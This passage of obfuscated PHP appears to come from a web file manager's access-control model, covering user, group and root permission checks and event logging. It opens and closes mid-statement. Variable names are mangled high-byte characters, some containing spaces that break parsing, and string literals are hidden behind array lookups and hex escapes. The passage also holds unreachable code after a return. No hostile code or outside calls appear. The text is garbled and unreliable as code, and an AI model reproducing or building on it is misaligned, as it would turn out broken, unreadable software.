$this->sourceAuthSelect($ñ¥Ä¦¯˜); $²Â‡ÛŠó = array(); foreach ($ñ¥Ä¦¯˜ as $õ¹²‹™³) { if (isset($—±¦‰õ[$õ¹²‹™³])) { $²Â‡ÛŠó[$õ¹²‹™³] = $—±¦‰õ[$õ¹²‹™³]; } } $àƒ˜·‡ñ = $this->userIsRoot($İ˜†ç“ƒ); $ÂÊä´Ö‡ = AuthModel::authAll(); $÷ø¿ø»Ë = array($öœÜÇê¨[414] => $ÂÊä´Ö‡, $öœÜÇê¨[2052] => array($öœÜÇê¨[419] => 0, $öœÜÇê¨[1869] => $ÂÊä´Ö‡, $öœÜÇê¨[420] => LNG($öœÜÇê¨[2053]), $öœÜÇê¨[1886] => $öœÜÇê¨[2054])); $òû”Õ¢Ç = array(); foreach ($“äúÚ¿ª as $õ¹²‹™³ => $›ˆÄÏ¤Ö) { if ($àƒ˜·‡ñ && $GLOBALS[$öœÜÇê¨[6]][$öœÜÇê¨[1882]]) { $òû”Õ¢Ç[$õ¹²‹™³] = $÷ø¿ø»Ë; continue; } $òû”Õ¢Ç[$õ¹²‹™³] = $this->makeSourceAuth($›ˆÄÏ¤Ö, $²Â‡ÛŠó, $İ˜†ç“ƒ); } return $òû”Õ¢Ç; } public function authDeepCheck($«Ö‡ëÀ“, $–½Ï³‡à = false) { $Ù»ø™°¦ =& $_SERVER[å¸¿•¶£]; $–½Ï³‡à = $–½Ï³‡à ? $–½Ï³‡à : USER_ID; $ŠÔî¯ÊÊ = $this->makeAuthDeep($–½Ï³‡à); if (!in_array($«Ö‡ëÀ“, $ŠÔî¯ÊÊ[$Ù»ø™°¦[2055]])) { return !1; } $î¹Ï¹Ğş = array(); foreach ($ŠÔî¯ÊÊ[$Ù»ø™°¦[2056]] as $Ô§ç„— => $–¥×‘õü) { if (!in_array($«Ö‡ëÀ“, $–¥×‘õü)) { continue; } $î¹Ï¹Ğş[] = $Ô§ç„—; } if (!$î¹Ï¹Ğş) { return !1; } $•¶µĞ¤š = $î¹Ï¹Ğş ? $î¹Ï¹Ğş[0] : $«Ö‡ëÀ“; return array($Ù»ø™°¦[414] => -1, $Ù»ø™°¦[467] => array($Ù»ø™°¦[419] => $Ù»ø™°¦[1195], $Ù»ø™°¦[1869] => $Ù»ø™°¦[198], $Ù»ø™°¦[420] => LNG($Ù»ø™°¦[2057]), $Ù»ø™°¦[1886] => $Ù»ø™°¦[2058]), $Ù»ø™°¦[2059] => LNG($Ù»ø™°¦[2060]), $Ù»ø™°¦[2061] => $this->sourceAuthInfo($•¶µĞ¤š)); } protected function makeAuthDeep($º°µÂüê = false) { $ıƒÑ‚¡è =& $_SERVER[å¸¿•¶£]; static $‰ÑåØœæ = array(); $º°µÂüê = $º°µÂüê ? $º°µÂüê : USER_ID; if (isset($‰ÑåØœæ[$º°µÂüê])) { return $‰ÑåØœæ[$º°µÂüê]; } $ªû½ƒÊ¸ = Model($ıƒÑ‚¡è[2062])->listData(); $©²áŠ˜ = array(); foreach ($ªû½ƒÊ¸ as $æøÉØæÉ) { if ($æøÉØæÉ[$ıƒÑ‚¡è[413]] == 0 && $æøÉØæÉ[$ıƒÑ‚¡è[1885]] == $ıƒÑ‚¡è[88]) { $©²áŠ˜[] = $æøÉØæÉ[$ıƒÑ‚¡è[399]]; } } $‡îü­ı = $this->userGroupParents($º°µÂüê); $é×•Œù¿ = array($ıƒÑ‚¡è[411] => SourceModel::TYPE_USER, $ıƒÑ‚¡è[496] => $º°µÂüê); if ($‡îü­ı) { $é×•Œù¿ = array(array($ıƒÑ‚¡è[411] => SourceModel::TYPE_USER, $ıƒÑ‚¡è[496] => $º°µÂüê), array($ıƒÑ‚¡è[411] => SourceModel::TYPE_GROUP, $ıƒÑ‚¡è[496] => array($ıƒÑ‚¡è[418], $‡îü­ı)), $ıƒÑ‚¡è[1007] => $ıƒÑ‚¡è[1961]); } $—Úì•ã­ = $this->field($ıƒÑ‚¡è[2063])->where($é×•Œù¿)->select(); $İ‹ôË£­ = array(); $ç€‚¦İ° = array_to_keyvalue_group($—Úì•ã­, $ıƒÑ‚¡è[402]); foreach ($ç€‚¦İ° as $—Ô³ŠÂ => $«½“…„É) { $ÑŠ·ƒÁƒ = $this->authArrayCheck($«½“…„É, $º°µÂüê); if ($ÑŠ·ƒÁƒ[$ıƒÑ‚¡è[414]] > 0) { $İ‹ôË£­[] = $—Ô³ŠÂ . $ıƒÑ‚¡è[12]; } } if ($‡îü­ı) { $˜£¸°â¡ = Model($ıƒÑ‚¡è[512]); foreach ($‡îü­ı as $Íˆ•™Ó) { $Ç¶€ó‰¶ = $˜£¸°â¡->getInfo($Íˆ•™Ó); if (!$Ç¶€ó‰¶ || !is_array($Ç¶€ó‰¶[$ıƒÑ‚¡è[87]])) { continue; } $İ‹ôË£­[] = $Ç¶€ó‰¶[$ıƒÑ‚¡è[87]][$ıƒÑ‚¡è[402]]; } } $õÌ¸¦ = array(); $—îÑ¶¯‡ = $‡îü­ı; $üÅæ¿ŸÖ = Model($ıƒÑ‚¡è[1346]); $˜£¸°â¡ = Model($ıƒÑ‚¡è[512]); $Òˆ¥Ó›ã = array(); $‘üÉ‰ñƒ = array(); $’Ø±ö»’ = array(); $†›Äºå = array(); if ($İ‹ôË£­) { $ÈøÅ÷õØ = $üÅæ¿ŸÖ->where(array($ıƒÑ‚¡è[402] => array($ıƒÑ‚¡è[418], $İ‹ôË£­)))->select(); foreach ($ÈøÅ÷õØ as $ğñ‚ƒÀ€) { $ëÁÛ¯ ± = $üÅæ¿ŸÖ->parentLevelArray($ğñ‚ƒÀ€[$ıƒÑ‚¡è[511]]); $õÌ¸¦ = array_merge($õÌ¸¦, $ëÁÛ¯ ±); $—îÑ¶¯‡[] = $ğñ‚ƒÀ€[$ıƒÑ‚¡è[496]]; $Òˆ¥Ó›ã[$ğñ‚ƒÀ€[$ıƒÑ‚¡è[402]]] = $ëÁÛ¯ ±; $‘üÉ‰ñƒ[$ğñ‚ƒÀ€[$ıƒÑ‚¡è[402]]] = $ğñ‚ƒÀ€[$ıƒÑ‚¡è[496]]; } } $—îÑ¶¯‡ = array_values(array_unique($—îÑ¶¯‡)); $Ÿ€½¶Æ = $—îÑ¶¯‡; foreach ($Ÿ€½¶Æ as $Íˆ•™Ó) { $Ç¶€ó‰¶ = $˜£¸°â¡->getInfo($Íˆ•™Ó); $ëÁÛ¯ ± = $üÅæ¿ŸÖ->parentLevelArray($Ç¶€ó‰¶[$ıƒÑ‚¡è[511]]); $—îÑ¶¯‡ = array_merge($—îÑ¶¯‡, $ëÁÛ¯ ±); } $—îÑ¶¯‡ = array_values(array_unique($—îÑ¶¯‡)); foreach ($—îÑ¶¯‡ as $Íˆ•™Ó) { $Ç¶€ó‰¶ = $˜£¸°â¡->getInfo($Íˆ•™Ó); $õÌ¸¦[] = $Ç¶€ó‰¶[$ıƒÑ‚¡è[87]][$ıƒÑ‚¡è[402]]; $’Ø±ö»’[$Íˆ•™Ó] = $Ç¶€ó‰¶[$ıƒÑ‚¡è[87]][$ıƒÑ‚¡è[402]]; $†›Äºå[$Íˆ•™Ó] = $üÅæ¿ŸÖ->parentLevelArray($Ç¶€ó‰¶[$ıƒÑ‚¡è[511]]); } foreach ($Òˆ¥Ó›ã as $ê¾¢•ô¶ => $şÖöõ†à) { $÷½À‡èÎ = $‘üÉ‰ñƒ[$ê¾¢•ô¶]; if (!$÷½À‡èÎ || !$’Ø±ö»’[$÷½À‡èÎ]) { continue; } $ì“¼³éÁ = array(); foreach ($†›Äºå[$÷½À‡èÎ] as $Íˆ•™Ó) { $ì“¼³éÁ[] = $’Ø±ö»’[$Íˆ•™Ó]; } $Òˆ¥Ó›ã[$ê¾¢•ô¶] = array_merge($ì“¼³éÁ, $şÖöõ†à); } $õÌ¸¦ = array_values(array_unique($õÌ¸¦)); $Ğ¼ê½®Š = array($ıƒÑ‚¡è[2055] => $õÌ¸¦, $ıƒÑ‚¡è[2056] => $Òˆ¥Ó›ã); $‰ÑåØœæ[$º°µÂüê] = $Ğ¼ê½®Š; return $Ğ¼ê½®Š; } private function makeSourceAuth($ øäéÁÈ, $­ôñ¥†ë, $Øµ’Ëã = false) { $Û½ØñŒç =& $_SERVER[å¸¿•¶£]; $¢òóØçî = $Û½ØñŒç[88]; $¸©€Ü¦Â = $ øäéÁÈ[$Û½ØñŒç[496]]; $›ü¼¢è = $ øäéÁÈ[$Û½ØñŒç[411]] == SourceModel::TYPE_GROUP; $îÂÖ º = $›ü¼¢è ? $this->groupRootAuth($¸©€Ü¦Â, $Øµ’Ëã) : !1; if ($îÂÖ º && Model($Û½ØñŒç[498])->authCheckAction($îÂÖ º[$Û½ØñŒç[413]], $Û½ØñŒç[1884])) { return $this->groupAuthInfo($îÂÖ º, $¸©€Ü¦Â); } $™¦ü‘ÉÈ = Model($Û½ØñŒç[1346])->parentLevelArray($ øäéÁÈ[$Û½ØñŒç[511]]); $™¦ü‘ÉÈ = array_merge(array($ øäéÁÈ[$Û½ØñŒç[402]]), array_reverse($™¦ü‘ÉÈ)); $¹õ¾¸ÂÏ = !1; foreach ($™¦ü‘ÉÈ as $òÙ°Ö¾) { if (!isset($­ôñ¥†ë[$òÙ°Ö¾])) { continue; } $ñø ‘»Û = $this->authMake($­ôñ¥†ë[$òÙ°Ö¾], $Øµ’Ëã); if ($ñø ‘»Û[$Û½ØñŒç[467]]) { $¹õ¾¸ÂÏ = $ñø ‘»Û; break; } } if (!$›ü¼¢è) { return $¹õ¾¸ÂÏ; } if (!$¹õ¾¸ÂÏ && $îÂÖ º) { $¹õ¾¸ÂÏ = $this->groupAuthInfo($îÂÖ º, $¸©€Ü¦Â); } if (!$¹õ¾¸ÂÏ) { $À³ôÆÔ = Model($Û½ØñŒç[512])->getInfo($¸©€Ü¦Â); $¶İŸŸ¡” = explode($Û½ØñŒç[50], trim($À³ôÆÔ[$Û½ØñŒç[511]], $Û½ØñŒç[50])); $¶İŸŸ¡” = array_reverse($¶İŸŸ¡”); foreach ($¶İŸŸ¡” as $Ô©È´¤ë) { if ($Ô©È´¤ë == $Û½ØñŒç[198] || $Ô©È´¤ë == $¢òóØçî) { continue; } $¹È–Ş›Æ = $this->groupRootAuth($Ô©È´¤ë, $Øµ’Ëã); if (!$¹È–Ş›Æ) { continue; } $¹õ¾¸ÂÏ = $this->groupAuthInfo($¹È–Ş›Æ, $Ô©È´¤ë); break; } } if (!$¹õ¾¸ÂÏ || $¹õ¾¸ÂÏ[$Û½ØñŒç[414]] <= 0) { $ÅÚ…øÊ = $this->authDeepCheck($ øäéÁÈ[$Û½ØñŒç[402]], $Øµ’Ëã); if ($ÅÚ…øÊ) { $¹õ¾¸ÂÏ = $ÅÚ…øÊ; } } return $¹õ¾¸ÂÏ; } private function userIsRoot($ªï©óæ = false) { $ÆÈÈ±£ =& $_SERVER[å¸¿•¶£]; if (!$ªï©óæ && _get($GLOBALS, $ÆÈÈ±£[494])) { return !0; } $Ï˜¬Í° = Model($ÆÈÈ±£[525])->getInfo($ªï©óæ); $ÎşËÑÃ´ = Model($ÆÈÈ±£[2064])->listData($Ï˜¬Í°[$ÆÈÈ±£[1555]]); if ($ÎşËÑÃ´ && $ÎşËÑÃ´[$ÆÈÈ±£[502]][$ÆÈÈ±£[2065]] == 1) { return !0; } return !1; } private function sourceAuthInfo($µ‡¤Éˆ‘) { $Û‰ Õ‹î =& $_SERVER[å¸¿•¶£]; $Ò¥ÓÆÉ¡ = Model($Û‰ Õ‹î[1346]); $ŞªÃéÁ = $Ò¥ÓÆÉ¡->sourceInfo($µ‡¤Éˆ‘); if (!$ŞªÃéÁ) { return !1; } $Ò¥ÓÆÉ¡->groupPathDisplay($ŞªÃéÁ); $àÏÖˆİı = array($ŞªÃéÁ); $àÏÖˆİı = $Ò¥ÓÆÉ¡->_listAppendPath($àÏÖˆİı); $ŞªÃéÁ = $àÏÖˆİı[0]; $±óß£‘ = $ŞªÃéÁ[$Û‰ Õ‹î[509]]; if (isset($ŞªÃéÁ[$Û‰ Õ‹î[517]])) { $ò’Ÿøå± = explode($Û‰ Õ‹î[8], trim($ŞªÃéÁ[$Û‰ Õ‹î[509]], $Û‰ Õ‹î[8])); array_shift($ò’Ÿøå±); $±óß£‘ = $ŞªÃéÁ[$Û‰ Õ‹î[515]] . $Û‰ Õ‹î[2066] . implode($Û‰ Õ‹î[8], $ò’Ÿøå±); } return array($Û‰ Õ‹î[420] => $ŞªÃéÁ[$Û‰ Õ‹î[32]], $Û‰ Õ‹î[84] => KodIO::make($ŞªÃéÁ[$Û‰ Õ‹î[402]]), $Û‰ Õ‹î[2067] => $±óß£‘); } private function groupAuthInfo($†ÍÚæÕœ, $û¸‰©òå) { $ÔœÈ¦ïÌ =& $_SERVER[å¸¿•¶£]; $ÉÀá©ã = Model($ÔœÈ¦ïÌ[512])->getInfo($û¸‰©òå); return array($ÔœÈ¦ïÌ[2068] => intval($†ÍÚæÕœ[$ÔœÈ¦ïÌ[413]]), $ÔœÈ¦ïÌ[2052] => $†ÍÚæÕœ, $ÔœÈ¦ïÌ[2069] => LNG($ÔœÈ¦ïÌ[2070]), $ÔœÈ¦ïÌ[2061] => array($ÔœÈ¦ïÌ[420] => $ÉÀá©ã[$ÔœÈ¦ïÌ[32]], $ÔœÈ¦ïÌ[84] => KodIO::make($ÉÀá©ã[$ÔœÈ¦ïÌ[87]][$ÔœÈ¦ïÌ[402]]), $ÔœÈ¦ïÌ[2067] => $ÉÀá©ã[$ÔœÈ¦ïÌ[516]])); } protected function groupRootAuth($œ”âıÄ¦, $Ç÷›Œ»µ = false) { $Ş³ÍÉØÒ =& $_SERVER[å¸¿•¶£]; $Ç÷›Œ»µ = $Ç÷›Œ»µ ? $Ç÷›Œ»µ : USER_ID; $¬ÆÉˆ¬ = $Ç÷›Œ»µ . $Ş³ÍÉØÒ[2071] . $œ”âıÄ¦; static $±ÜºŒÄæ = array(); if (isset($±ÜºŒÄæ[$¬ÆÉˆ¬])) { return $±ÜºŒÄæ[$¬ÆÉˆ¬]; } $äŞí©“À = Model($Ş³ÍÉØÒ[512])->getInfo($œ”âıÄ¦); $à˜‡ê‚ = $this->userGroupList($Ç÷›Œ»µ); $¯Ü’ªæü = isset($à˜‡ê‚[$œ”âıÄ¦]) ? $à˜‡ê‚[$œ”âıÄ¦][$Ş³ÍÉØÒ[413]] : !1; if ($¯Ü’ªæü && Model($Ş³ÍÉØÒ[498])->authCheckAction($¯Ü’ªæü[$Ş³ÍÉØÒ[413]], $Ş³ÍÉØÒ[1884])) { $±ÜºŒÄæ[$¬ÆÉˆ¬] = $¯Ü’ªæü; return $¯Ü’ªæü; } $ğÙç¯ó° = $this->sourceAuthSelect($äŞí©“À[$Ş³ÍÉØÒ[87]][$Ş³ÍÉØÒ[402]]); $ëøô‹é• = $ğÙç¯ó° ? $this->authMake($ğÙç¯ó°, $Ç÷›Œ»µ) : !1; $”‰ùÂ­ = $ëøô‹é• ? $ëøô‹é•[$Ş³ÍÉØÒ[467]] : !1; $±ÜºŒÄæ[$¬ÆÉˆ¬] = $”‰ùÂ­ ? $”‰ùÂ­ : $¯Ü’ªæü; return $±ÜºŒÄæ[$¬ÆÉˆ¬]; } public function authOwnerApply($–â”–§‡) { $÷§Ú»¬° =& $_SERVER[å¸¿•¶£]; if (empty($–â”–§‡[$÷§Ú»¬°[413]]) || isset($–â”–§‡[$÷§Ú»¬°[2072]]) && $–â”–§‡[$÷§Ú»¬°[2072]]) { return $–â”–§‡; } if (AuthModel::authCheckRoot($–â”–§‡[$÷§Ú»¬°[413]][$÷§Ú»¬°[414]])) { return $–â”–§‡; } $ıÓÛÆÁ§ = Model($÷§Ú»¬°[1346])->parentLevelArray($–â”–§‡[$÷§Ú»¬°[511]]); $ıÓÛÆÁ§ = array_merge(array($–â”–§‡[$÷§Ú»¬°[402]]), array_reverse($ıÓÛÆÁ§)); $ÈéŠí“ä = $this->sourceAuthSelect($ıÓÛÆÁ§); $İêÙÓ×Í = array(); $ßÍ²é³ = array(); foreach ($ÈéŠí“ä as $Ïæ¾Î·Œ => $¬ÀúÁôø) { $™ØíÂã© = $this->authFolderOwnerUser($¬ÀúÁôø); $İêÙÓ×Í[$Ïæ¾Î·Œ] = $™ØíÂã©; $ßÍ²é³ = array_merge($ßÍ²é³, $™ØíÂã©[$÷§Ú»¬°[590]]); if ($™ØíÂã©[$÷§Ú»¬°[2073]]) { break; } } if (count($ßÍ²é³) == 0) { $ßÍ²é³ = $this->authFolderOwnerGroup($–â”–§‡[$÷§Ú»¬°[496]]); } $ßÍ²é³ = array_unique($ßÍ²é³); if (AuthModel::authCheckRoot($–â”–§‡[$÷§Ú»¬°[413]][$÷§Ú»¬°[414]])) { $ßÍ²é³[] = USER_ID; } $–â”–§‡[$÷§Ú»¬°[413]][$÷§Ú»¬°[2074]] = Model($÷§Ú»¬°[504])->userListInfo($ßÍ²é³); return $–â”–§‡; } private function authFolderOwnerGroup($€¯ÆÖïŠ) { $¬×ì¬æê =& $_SERVER[å¸¿•¶£]; $¡Òè¿ = Model($¬×ì¬æê[1953])->where(array($¬×ì¬æê[1863] => $€¯ÆÖïŠ))->select(); $Å£÷©€ä = array(); if (!$¡Òè¿) { return $Å£÷©€ä; } foreach ($¡Òè¿ as $ÈœÀÏ§ï) { $èÈÅê¡ = $this->authInfo($ÈœÀÏ§ï); if (AuthModel::authCheckRoot($èÈÅê¡[$¬×ì¬æê[413]])) { $Å£÷©€ä[] = $ÈœÀÏ§ï[$¬×ì¬æê[1674]]; } } return $Å£÷©€ä; } private function authFolderOwnerUser($×ĞùÈ–°) { $ØÉ±Şã =& $_SERVER[å¸¿•¶£]; $ìÖª§‚ = array(); $À…„Šİ = !1; foreach ($×ĞùÈ–° as $Š¦»´ë”) { $–ÛŠĞÔŸ = $this->authInfo($Š¦»´ë”); if ($Š¦»´ë”[$ØÉ±Şã[496]] == $ØÉ±Şã[198]) { $À…„Šİ = !0; } if ($Š¦»´ë”[$ØÉ±Şã[411]] == SourceModel::TYPE_USER) { if (AuthModel::authCheckRoot($–ÛŠĞÔŸ[$ØÉ±Şã[413]])) { $ìÖª§‚[] = $Š¦»´ë”[$ØÉ±Şã[496]]; } } } return array($ØÉ±Şã[590] => $ìÖª§‚, $ØÉ±Şã[2073] => $À…„Šİ); } public function authMake($®èû‘Ôœ, $ğ©’Ê… = false) { $Æ©ÄÜöë =& $_SERVER[å¸¿•¶£]; $¶ĞÔÊáØ = $this->authArrayCheck($®èû‘Ôœ, $ğ©’Ê…); if ($¶ĞÔÊáØ[$Æ©ÄÜöë[2075]]) { $¶ĞÔÊáØ[$Æ©ÄÜöë[2075]] = $this->sourceAuthInfo($¶ĞÔÊáØ[$Æ©ÄÜöë[2075]]); } return $¶ĞÔÊáØ; } public function authArrayCheck($— »·èî, $Â¤×Èçô = false) { $áœÖñ¯å =& $_SERVER[å¸¿•¶£]; if (!$— »·èî) { return array($áœÖñ¯å[414] => 0, $áœÖñ¯å[467] => !1); } $Â¤×Èçô = $Â¤×Èçô ? $Â¤×Èçô : USER_ID; $£“íÏÛØ = 0; $ª’Ü…ˆé = 0; $³‡µ°è = 0; $¬ÄŠò•ë = 0; $µè»å¼™ = 0; $çÜı¡¬Æ = 0; $Ê¬Öã…£ = 1000; $„¬Œ¹”æ = 0; $ÛâÚÌ°è = 0; $î¾Àœô· = 0; $æ˜É«÷ = 0; $ÔÙÃ±Ëó = array($áœÖñ¯å[402] => 0); foreach ($— »·èî as $ÔÙÃ±Ëó) { $ùô¸Æî = $this->authInfo($ÔÙÃ±Ëó); if (!$ùô¸Æî) { continue; } $©¢¡ª£Ì = $ÔÙÃ±Ëó[$áœÖñ¯å[496]]; $·îÄö¬Ô = intval($ùô¸Æî[$áœÖñ¯å[413]]); if ($ÔÙÃ±Ëó[$áœÖñ¯å[411]] == SourceModel::TYPE_USER && $©¢¡ª£Ì == $Â¤×Èçô) { $£“íÏÛØ = !0; $³‡µ°è = $ùô¸Æî; $ª’Ü…ˆé = $·îÄö¬Ô; } else { if ($ÔÙÃ±Ëó[$áœÖñ¯å[411]] == SourceModel::TYPE_GROUP && $this->groupContainUser($©¢¡ª£Ì, $Â¤×Èçô)) { $¬ÄŠò•ë = !0; $˜¥”Õƒ = $this->groupStepToUserGroup($©¢¡ª£Ì, $Â¤×Èçô); if ($˜¥”Õƒ < $Ê¬Öã…£) { $Ê¬Öã…£ = $˜¥”Õƒ; $µè»å¼™ = $·îÄö¬Ô; $çÜı¡¬Æ = $ùô¸Æî; $„¬Œ¹”æ = $©¢¡ª£Ì; } if ($˜¥”Õƒ == $Ê¬Öã…£ && $·îÄö¬Ô >= $µè»å¼™) { $µè»å¼™ = $·îÄö¬Ô; $çÜı¡¬Æ = $ùô¸Æî; $„¬Œ¹”æ = $©¢¡ª£Ì; } } else { if ($©¢¡ª£Ì == $áœÖñ¯å[198]) { $ÛâÚÌ°è = !0; $æ˜É«÷ = $ùô¸Æî; $î¾Àœô· = $·îÄö¬Ô; } } } } if ($£“íÏÛØ) { $‹¾ƒÖ¸ = $ª’Ü…ˆé; $ùô¸Æî = $³‡µ°è; $³¹ÈˆÖ† = LNG($áœÖñ¯å[2076]); } else { if ($¬ÄŠò•ë) { $‹¾ƒÖ¸ = $µè»å¼™; $ùô¸Æî = $çÜı¡¬Æ; $Š™½ßğ = Model($áœÖñ¯å[512])->getInfo($„¬Œ¹”æ); $³¹ÈˆÖ† = $áœÖñ¯å[162] . $Š™½ßğ[$áœÖñ¯å[516]] . $áœÖñ¯å[2077] . LNG($áœÖñ¯å[2078]); } else { if ($ÛâÚÌ°è) { $‹¾ƒÖ¸ = $î¾Àœô·; $ùô¸Æî = $æ˜É«÷; $³¹ÈˆÖ† = LNG($áœÖñ¯å[2049]); } else { $‹¾ƒÖ¸ = 0; $ùô¸Æî = !1; $³¹ÈˆÖ† = $áœÖñ¯å[12]; } } } $ö•³à = array($áœÖñ¯å[2068] => intval($‹¾ƒÖ¸), $áœÖñ¯å[2052] => $ùô¸Æî, $áœÖñ¯å[2069] => $³¹ÈˆÖ†, $áœÖñ¯å[2061] => $ÔÙÃ±Ëó[$áœÖñ¯å[402]]); return $ö•³à; } private function groupContainUser($ìˆïåÕ, $Ê¥˜â³” = false) { return in_array($ìˆïåÕ, $this->userGroupParents($Ê¥˜â³”)); } private function groupStepToUserGroup($ÚÄ”ú¾Á, $ÜÀåŒ† = false) { $ŠğÄéÅ =& $_SERVER[å¸¿•¶£]; $æ°àË¡á = $this->userGroupList($ÜÀåŒ†); $ªåæŠŒ¬ = 1000; $Ä¿ïé° = $GLOBALS[$ŠğÄéÅ[6]][$ŠğÄéÅ[89]][$ŠğÄéÅ[1966]] == 1; $ºÈë¿Òİ = $Ä¿ïé° ? 3 : 2; foreach ($æ°àË¡á as $üö›™îË) { if ($üö›™îË[$ŠğÄéÅ[1863]] == $ÚÄ”ú¾Á) { return 0; } $æâ‰µÂ = explode($ŠğÄéÅ[50], trim($üö›™îË[$ŠğÄéÅ[511]], $ŠğÄéÅ[50])); if ($æâ‰µÂ[0] == $ŠğÄéÅ[198] && count($æâ‰µÂ) > $ºÈë¿Òİ) { $Ğí»¼ À = array_reverse(array_slice($æâ‰µÂ, $ºÈë¿Òİ)); $ˆº­ıâŒ = array_search($ÚÄ”ú¾Á, $Ğí»¼ À); if ($ˆº­ıâŒ !== !1 && $ˆº­ıâŒ + 1 <= $ªåæŠŒ¬) { $ªåæŠŒ¬ = $ˆº­ıâŒ + 1; } } } return $ªåæŠŒ¬; } private function userGroupList($ô¡âÜôº = false) { $ÊñúæÊÕ =& $_SERVER[å¸¿•¶£]; static $·¡áÒ¢¹ = array(); if (isset($·¡áÒ¢¹[$ô¡âÜôº])) { return $·¡áÒ¢¹[$ô¡âÜôº]; } $ß×¢®¼€ = Model($ÊñúæÊÕ[525])->getInfo($ô¡âÜôº); $·¡áÒ¢¹[$ô¡âÜôº] = array_to_keyvalue($ß×¢®¼€[$ÊñúæÊÕ[2050]], $ÊñúæÊÕ[1863]); return $·¡áÒ¢¹[$ô¡âÜôº]; } public function userGroupParents($ÇËÑ€˜â) { $ãåÍÌßÚ =& $_SERVER[å¸¿•¶£]; static $úìÕáá = array(); $ÇËÑ€˜â = $ÇËÑ€˜â ? $ÇËÑ€˜â : USER_ID; if (isset($úìÕáá[$ÇËÑ€˜â])) { return $úìÕáá[$ÇËÑ€˜â]; } $Š½Í©š­ = $this->userGroupList($ÇËÑ€˜â); $Äıèö• = array(); $‚ÊĞÀ’¹ = $GLOBALS[$ãåÍÌßÚ[6]][$ãåÍÌßÚ[89]][$ãåÍÌßÚ[1966]] == 1; $Ğ»ÄÆœÓ = $‚ÊĞÀ’¹ ? 3 : 2; foreach ($Š½Í©š­ as $Ôª€½) { $«åç¨˜Ê = array($Ôª€½[$ãåÍÌßÚ[1863]]); $äÀé÷Äâ = explode($ãåÍÌßÚ[50], trim($Ôª€½[$ãåÍÌßÚ[511]], $ãåÍÌßÚ[50])); if ($äÀé÷Äâ[0] == $ãåÍÌßÚ[198] && count($äÀé÷Äâ) > $Ğ»ÄÆœÓ) { $Æ°“­Å³ = array_slice($äÀé÷Äâ, $Ğ»ÄÆœÓ); $«åç¨˜Ê = array_merge($«åç¨˜Ê, array_reverse($Æ°“­Å³)); } $Äıèö• = array_merge($Äıèö•, $«åç¨˜Ê); } $úìÕáá[$ÇËÑ€˜â] = array_unique($Äıèö•); return $úìÕáá[$ÇËÑ€˜â]; } public function authTargetInfoMake($öñ›ƒôÎ) { $Á±¸¶õà =& $_SERVER[å¸¿•¶£]; $ÉÕÈá½ó = array(); $×÷¤éĞ¬ = array(); foreach ($öñ›ƒôÎ as $²ßü»¢¡) { if ($²ßü»¢¡[$Á±¸¶õà[411]] == SourceModel::TYPE_USER) { $ÉÕÈá½ó[] = intval($²ßü»¢¡[$Á±¸¶õà[496]]); } else { if ($²ßü»¢¡[$Á±¸¶õà[411]] == SourceModel::TYPE_GROUP) { $×÷¤éĞ¬[] = intval($²ßü»¢¡[$Á±¸¶õà[496]]); } } } if ($ÉÕÈá½ó) { $ÉÕÈá½ó = Model($Á±¸¶õà[504])->userListInfo($ÉÕÈá½ó); } if ($×÷¤éĞ¬) { $‘¦à´ê— = array($Á±¸¶õà[1951] => array($Á±¸¶õà[418], $×÷¤éĞ¬)); $×÷¤éĞ¬ = Model($Á±¸¶õà[512])->field($Á±¸¶õà[2079])->where($‘¦à´ê—)->select(); $×÷¤éĞ¬ = array_to_keyvalue($×÷¤éĞ¬, $Á±¸¶õà[1863]); } return array($Á±¸¶õà[2080] => $ÉÕÈá½ó, $Á±¸¶õà[2081] => $×÷¤éĞ¬); } public function authInfo($‚·Œ­ ) { $Òà¨ÕÎô =& $_SERVER[å¸¿•¶£]; if ($‚·Œ­ [$Òà¨ÕÎô[1967]]) { $ø–¨è£² = Model($Òà¨ÕÎô[498])->listData($‚·Œ­ [$Òà¨ÕÎô[1967]]); if (!$ø–¨è£²) { return !1; $·¯­×»Å = Model($Òà¨ÕÎô[498])->listData(); $§€²Ä§ø = array_filter_by_field($·¯­×»Å, $Òà¨ÕÎô[413], $Òà¨ÕÎô[198]); return $§€²Ä§ø; } $·Ñİ¹à¦ = array_field_key($ø–¨è£², array($Òà¨ÕÎô[399], $Òà¨ÕÎô[32], $Òà¨ÕÎô[413], $Òà¨ÕÎô[1886], $Òà¨ÕÎô[1887])); $·Ñİ¹à¦[$Òà¨ÕÎô[2082]] = $‚·Œ­ ; return $·Ñİ¹à¦; } else { return array($Òà¨ÕÎô[419] => 0, $Òà¨ÕÎô[1869] => $‚·Œ­ [$Òà¨ÕÎô[2027]], $Òà¨ÕÎô[420] => $Òà¨ÕÎô[12], $Òà¨ÕÎô[1886] => $Òà¨ÕÎô[2083]); } } } class SourceEventModel extends ModelBase { protected $tableName = "\x69\x6f\137\163\x6f\x75\162\143\145\x5f\145\x76\145\156\164"; protected $dataAuto = array(array("\143\x72\x65\141\x74\x65\124\x69\x6d\145", "\x74\x69\155\x65", "\x69\156\163\145\162\164", "\146\165\156\x63\x74\x69\157\x6e"), array("\x64\x65\x73\x63", '', "\x69\156\x73\145\x72\x74\x2c\x75\x70\144\x61\x74\x65\54\x73\145\x6c\x65\x63\164", "\x6a\163\x6f\x6e")); protected $eventSave = true; public function recodeStop() { $this->eventSave = !1; } public function recodeStart() { $this->eventSave = !0; } public function addEvent($ĞÆİÖÄ†, $‹‰áÆ¬á, $”Åôîô = '') { $”êÏ¼Ì¹ =& $_SERVER[å¸¿•¶£]; if (!$this->eventSave) { return; } $è‰Ê‘‰Ä = Model($”êÏ¼Ì¹[1346])->sourceInfo($ĞÆİÖÄ†); if (!$è‰Ê‘‰Ä) { return !1; } if ($this->isCacheEvent($è‰Ê‘‰Ä, $‹‰áÆ¬á)) { return; } if ($”Åôîô && is_string($”Åôîô)) { $”Åôîô = array($”êÏ¼Ì¹[1902] => $”Åôîô); } $òãëêÑ‘ = array($”êÏ¼Ì¹[417] => $ĞÆİÖÄ†, $”êÏ¼Ì¹[2084] => $è‰Ê‘‰Ä[$”êÏ¼Ì¹[432]], $”êÏ¼Ì¹[2085] => $è‰Ê‘‰Ä[$”êÏ¼Ì¹[32]], $”êÏ¼Ì¹[509] => !empty($è‰Ê‘‰Ä[$”êÏ¼Ì¹[509]]) ? $è‰Ê‘‰Ä[$”êÏ¼Ì¹[509]] : $”êÏ¼Ì¹[12], $”êÏ¼Ì¹[1665] => USER_ID, $”êÏ¼Ì¹[422] => $‹‰áÆ¬á, $”êÏ¼Ì¹[1667] => $”Åôîô); $this->addSystemLog($‹‰áÆ¬á, $òãëêÑ‘); unset($òãëêÑ‘[$”êÏ¼Ì¹[2085]], 